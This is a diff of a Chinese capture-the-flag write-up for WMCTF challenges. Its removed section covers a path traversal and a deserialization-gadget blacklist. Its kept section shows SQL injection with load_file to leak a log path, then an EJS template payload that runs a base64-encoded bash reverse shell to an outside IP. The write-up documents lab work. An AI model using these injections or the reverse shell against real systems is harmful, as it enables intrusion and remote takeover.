@@ -1,13 +1,13 @@
 ---
 layout: post
-title: WMCTF中java
+title: WMCTF中其他的题目
 categories: [blog ]
 tags: [Java,]
 description: "当时禁了非常多的类"
 image:
   feature: windows.jpg
-  credit: Azeril
-  creditlink: azeril.com
+  credit: JYcxk
+  creditlink: https://github.com/
  
 
 ---
@@ -16,300 +16,11 @@ image:
 
 # WMCTF
 
-## AnyFileRead
 
-首先分析AdminController路由
 
-```java
-@RequestMapping({"/admin"})
-@Controller
-/* loaded from: app.jar:BOOT-INF/classes/cc/saferoad/controller/AdminController.class */
-public class AdminController {
-    @GetMapping({"/*"})
-    public String Manage() {
-        return "manage";
-    }
+## 你的权限放我来
 
-    @RequestMapping({"/{*path}"})
-    @ResponseBody
-    public void fileDownload(@PathVariable("path") String path, HttpServletResponse response) throws IOException {
-        File file = new File("/tmp/" + path);
-        InputStream fis = new BufferedInputStream(new FileInputStream(file));
-        byte[] buffer = new byte[fis.available()];
-        fis.read(buffer);
-        fis.close();
-        response.reset();
-        response.setCharacterEncoding(UriEscape.DEFAULT_ENCODING);
-        response.addHeader(HttpHeaders.CONTENT_DISPOSITION, "attachment;filename=" + URLEncoder.encode(path, UriEscape.DEFAULT_ENCODING));
-        response.addHeader(HttpHeaders.CONTENT_LENGTH, "" + file.length());
-        OutputStream outputStream = new BufferedOutputStream(response.getOutputStream());
-        response.setContentType("application/octet-stream");
-        outputStream.write(buffer);
-        outputStream.flush();
-    }
-}
-```
-
-Java安全之Spring Security 5.6.3**绕过**
-
-搜了好多文章也试了好多，但都绕不过去 %0a%0d
-
-### 	SpringSecurityConfig
-
-```java
-public class SpringSecurityConfig extends WebSecurityConfigurerAdapter {
-    @Bean
-    public HttpFirewall httpFirewall() {
-        return new CustomHttpFirewall();
-    }
-
-    @Override // org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter
-    protected void configure(HttpSecurity httpSecurity) throws Exception {
-        httpSecurity.authorizeRequests().antMatchers("/admin/**").authenticated();
-    }
-}
-```
-
-```java
-  protected void configure(StrictHttpFirewall firewalledRequest) {
-        firewalledRequest.setAllowUrlEncodedSlash(true);//允许URL路径中使用编码的斜杠
-        firewalledRequest.setAllowUrlEncodedDoubleSlash(true);//允许使用双斜杠
-        firewalledRequest.setAllowUrlEncodedPeriod(true);//允许URL路径中使用编码的句点
-    }
-
-```
-
-![image-20230819174200675](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819174200675.png)
-
-[浅谈SpringSecurity与CVE-2023-22602 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/640655127)
-
-![image-20230819175751028](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819175751028.png)
-
-所以说这道题
-
-path为  ../flag
-
-```
-File file = new File("/tmp/" + path);
-```
-
-## ez_java_agagin
-
-![image-20230819212638191](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212638191.png)
-
-扫完目录也就一个DS_store泄露并没什么有用的东西。
-
-但是源码这两个url很奇怪，burp测一下功能
-
-![image-20230819212840640](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212840640.png)
-
-一个只能读取图片，一个回显
-
-must contain java and not have flag
-
-![image-20230819212907045](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819212907045.png)
-
-![image-20230819215225628](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819215225628.png)
-
-![image-20230819222350800](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819222350800.png)
-
-WMCTF{wowowowoowow_you_can_decode_meeeeee!}
-
-## misc
-
-![image-20230819230254875](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230819230254875.png)
-
-## ez_java_rev
-
-有用的就这一个类(就是有一个xml黑名单)
-
-```java
-@WebServlet(name = "CmdServlet", urlPatterns = {"/closetome"})
-/* loaded from: Imagefile.class */
-public class CmdServlet extends HttpServlet {
-    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-    }
-
-    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
-        String exp = req.getParameter("exp");
-        byte[] b = Base64.getDecoder().decode(exp);
-        ObjectInputStream ois = null;
-        try {
-            ois = new SerialKiller(new ByteArrayInputStream(b), "K:\\javafile\\wmctf-web\\src\\main\\resources\\serialkiller.xml");
-        } catch (ConfigurationException e) {
-            e.printStackTrace();
-        }
-        try {
-            ois.readObject();
-        } catch (ClassNotFoundException e2) {
-            e2.printStackTrace();
-        }
-    }
-}
-```
-
-正好前不久做了一道MRCTF的题差不多，但过滤的少都是用替代类ｆａｃｔｏｒｙ代替
-
-这是我做的题是这样
-
-```javascript
-        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InvokerTransformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.ConstantTransformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateTransformer$</regexp>
-```
-
-这道题的过滤是
-
-```java
- <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
-        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
-        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
-        <regexp>java\.security\.SignedObject$</regexp>
-        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
-```
-
-```java
-<config>
-    <refresh>6000</refresh>
-    <mode>
-        <!--  set to 'false' for blocking mode  -->
-        <profiling>false</profiling>
-    </mode>
-    <logging>
-        <enabled>false</enabled>
-    </logging>
-    <blacklist>
-        <!--  ysoserial's CommonsCollections1,3,5,6 payload   -->
-        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
-        <regexp>javax\.management\.BadAttributeValueExpException$</regexp>
-        <regexp>org\.apache\.commons\.collections\.keyvalue\.TiedMapEntry$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.ChainedTransformer$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TemplatesImpl$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.trax\.TrAXFilter$</regexp>
-        <regexp>java\.security\.SignedObject$</regexp>
-        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functors\.InstantiateFactory$</regexp>
-        <regexp>com\.sun\.org\.apache\.xalan\.internal\.xsltc\.traxTrAXFilter$</regexp>
-        <regexp>org\.apache\.commons\.collections\.functorsFactoryTransformer$</regexp>
-        <!--  ysoserial's CommonsCollections2,4 payload   -->
-        <regexp>org\.apache\.commons\.beanutils\.BeanComparator$</regexp>
-        <regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
-        <regexp>com\.sun\.rowset\.JdbcRowSetImpl$</regexp>
-        <regexp>java\.rmi\.registry\.Registry$</regexp>
-        <regexp>java\.rmi\.server\.ObjID$</regexp>
-        <regexp>java\.rmi\.server\.RemoteObjectInvocationHandler$</regexp>
-        <regexp>org\.springframework\.beans\.factory\.ObjectFactory$</regexp>
-        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$MethodInvokeTypeProvider$</regexp>
-        <regexp>org\.springframework\.aop\.framework\.AdvisedSupport$</regexp>
-        <regexp>org\.springframework\.aop\.target\.SingletonTargetSource$</regexp>
-        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
-        <regexp>org\.springframework\.core\.SerializableTypeWrapper\$TypeProvider$</regexp>
-        <regexp>org\.springframework\.aop\.framework\.JdkDynamicAopProxy$</regexp>
-        <regexp>java\.util\.PriorityQueue$</regexp>
-        <regexp>java\.lang\.reflect\.Proxy$</regexp>
-        <regexp>javax\.management\.MBeanServerInvocationHandler$</regexp>
-        <regexp>javax\.management\.openmbean\.CompositeDataInvocationHandler$</regexp>
-        <regexp>java\.beans\.EventHandler$</regexp>
-        <regexp>java\.util\.Comparator$</regexp>
-        <regexp>org\.reflections\.Reflections$</regexp>
-    </blacklist>
-    <whitelist>
-        <regexp>.*</regexp>
-    </whitelist>
-</config>
-```
-
-打cc7这条链子的时候，发现只有chainedtransformer被禁了，本来想找它的替代类
-
-但是找了一圈没找到，并且这个类还不能删了。
-
-```java
-commons-collections-3.2.1.jar
-commons-compress-1.20.jar
-commons-configuration-1.10.jar
-commons-fileupload-1.4.jar
-commons-io-2.5.jar
-commons-lang-2.6.jar
-commons-lang3-3.12.0.jar
-commons-logging-1.2.jar
-commons-logging-api-1.1.jar
-commons-vfs2-2.0.jar
-javassist-3.12.1.GA.jar
-junrar-0.7.jar
-maven-scm-api-1.4.jar
-maven-scm-provider-svn-commons-1.4.jar
-maven-scm-provider-svnexe-1.4.jar
-plexus-utils-1.5.6.jar
-regexp-1.3.jar
-serialkiller-0.4.jar
-xz-1.9.jar
-```
-
-### 赛后复现没有官方的ｗｐ但是在群里的✌说了一句cc7+RMI二次反序列化（整）
-
-#### 先调试一下CC7 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## 你的权限放着我来
-
-![image-20230820170743457](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230820170743457.png)
+![image-20230820170743457](..\img\final\image-20230820170743457.png)
 
 注册登陆后看到其他用户，可以猜想到这是一个数据库
 
@@ -323,15 +34,15 @@ xz-1.9.jar
 
 登陆界面回显	
 
-![image-20230820202007118](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230820202007118.png)
+![image-20230820202007118](..\img\final\image-20230820202007118.png)
 
-![image-20230820202741171](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230820202741171.png)
+![image-20230820202741171](..\img\final\image-20230820202741171.png)
 
-![image-20230820202729437](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230820202729437.png)
+![image-20230820202729437](..\img\final\image-20230820202729437.png)
 
 发现直接发送到我的邮箱了
 
-![image-20230820230613247](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230820230613247.png)
+![image-20230820230613247](..\img\final\image-20230820230613247.png)
 
 本来想改密码直接换这个邮箱的毕竟题目源码有几个可疑的，但是发现token会进行校验
 
@@ -394,11 +105,11 @@ function getPostById(id) {
 }
 ```
 
-![image-20230822163807965](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822163807965.png)
+![image-20230822163807965](..\img\final\image-20230822163807965.png)
 
-发现出现了sql注入报错，说明存在sql这时候![image-20230822163856426](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822163856426.png)
+发现出现了sql注入报错，说明存在sql这时候![image-20230822163856426](..\img\final\image-20230822163856426.png)
 
-然后我们需要获得ping码，![image-20230822164110854](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822164110854.png)
+然后我们需要获得ping码，![image-20230822164110854](..\img\final\image-20230822164110854.png)
 
 然后看✌们wp说是从   发现主程序启动的日志在`/home/ezblog/.pm2/logs/main-out.log`中
 
@@ -412,7 +123,7 @@ find / -name "logs" -type d   全局搜索logs日志文件夹
 其实通过看dockerfile文件，能看的差不多
 ```
 
-![image-20230822172053413](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822172053413.png)
+![image-20230822172053413](..\img\final\image-20230822172053413.png)
 
 ```
 但是找了一圈没找到很疑惑
@@ -420,13 +131,13 @@ find / -name "logs" -type d   全局搜索logs日志文件夹
 /post/-1%20union%20select%201,2,load_file(0x2f686f6d652f657a626c6f672f2e706d322f6c6f67732f6d61696e2d6f75742e6c6f67)/edit
 ```
 
-![image-20230822165130652](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822165130652.png)
+![image-20230822165130652](..\img\final\image-20230822165130652.png)
 
-![image-20230822172203881](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822172203881.png)
+![image-20230822172203881](..\img\final\image-20230822172203881.png)
 
 然后就可以直接访问/console输入pin码
 
-![image-20230822172243408](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822172243408.png)
+![image-20230822172243408](..\img\final\image-20230822172243408.png)
 
 然后到了这个界面（如果说上面的拼死命可能做出，但是后面卧槽我是真不行）
 
@@ -471,9 +182,9 @@ set global log_output='file'; -- 设置输出类型为file
     SELECT "<% global.process.mainModule.require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMjI0LjU3LzQ0NDQgMD4mMQ==}|base64 -d|bash'); %>";
 ```
 
-![image-20230822221718926](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822221718926.png)
+![image-20230822221718926](..\img\final\image-20230822221718926.png)
 
-![image-20230822223223891](C:\Users\c'x'k\AppData\Roaming\Typora\typora-user-images\image-20230822223223891.png)
+![image-20230822223223891](..\img\final\image-20230822223223891.png)
 
 理想状态是在中间建立表，然后下面渲染模板，用的是docker中的绝对路径（但是却没成功）不知道自己操作哪里错了。
 
